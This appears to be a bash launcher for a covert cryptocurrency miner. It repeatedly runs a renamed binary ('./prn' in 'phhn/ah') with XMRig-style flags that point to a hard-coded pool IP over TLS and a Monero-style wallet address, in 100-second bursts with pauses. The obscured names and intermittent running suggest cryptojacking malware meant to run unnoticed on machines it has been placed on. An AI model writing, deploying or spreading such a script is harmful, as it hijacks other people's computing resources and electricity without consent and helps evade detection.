#!/bin/bash

while true; do
    # Run the command for 100 seconds
    timeout 100s bash -c 'cd phhn/ah && ./prn -o 95.179.241.203:443 -u 85a5qsVSC9H6xxY57AQvrHaaToUkdeZKH8t9Wf2NhAWwfxXcq4SrLWj4a6b8WPzEDMKmRbNX5h52118dho1SPGH59oBCYJB -k --tls -p pen'

    # Pause for 10 seconds
    sleep 10
done
